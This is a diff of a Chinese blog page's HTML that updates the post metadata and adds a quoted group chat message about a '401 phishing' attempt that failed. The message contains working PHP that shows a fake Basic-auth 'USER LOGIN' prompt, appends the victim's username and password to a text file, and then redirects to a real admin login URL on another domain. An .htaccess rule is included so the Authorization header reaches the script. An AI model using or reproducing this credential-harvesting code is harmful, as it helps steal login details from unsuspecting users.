@@ -397,21 +397,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-18
+                    2020-02-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    444
+                    546
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 				
@@ -458,7 +458,20 @@ if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW']))
 
 ?&gt;
 开启401</code></pre><p>接着创建文件 .htaccess 写入内容</p>
-<pre><code>Options +FollowSymlinks -Multiviews RewriteEngine On #Authorization Headers RewriteCond %{HTTP:Authorization} ^(.+)$ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><script>
+<pre><code>Options +FollowSymlinks -Multiviews
+RewriteEngine On
+#Authorization Headers
+RewriteCond %{HTTP:Authorization} ^(.+)$
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><blockquote>
+<p>@全体成员 昨晚关于401钓鱼不成功。</p>
+<p>首先代码：保存为1.php<br>&lt;?php</p>
+<p>if(!isset($_SERVER[‘PHP_AUTH_USER’]) &amp;&amp; !isset($_SERVER[‘PHP_AUTH_PW’])) {<br>    Header(“WWW-Authenticate: Basic realm="USER LOGIN"“);<br>    Header(“HTTP/1.0 401 Unauthorized”);<br>} else {<br>    @file_put_contents(‘./b4dboy.txt’, $_SERVER[‘PHP_AUTH_USER’].’|’.$_SERVER[‘PHP_AUTH_PW’].”\r\n”, FILE_APPEND);<br>    header(“Location: <a href="http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login&quot;" target="_blank" rel="noopener">http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login"</a>);<br>}</p>
+<p>?&gt;</p>
+<p>接着创建文件 .htaccess 写入内容<br>Options +FollowSymlinks -Multiviews<br>RewriteEngine On</p>
+<p>#Authorization Headers<br>RewriteCond %{HTTP:Authorization} ^(.+)$<br>RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</p>
+<p>开启401</p>
+</blockquote>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -1156,7 +1169,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">57.4k</span>&nbsp;字
+                class="white-color">57.5k</span>&nbsp;字
             
             
             
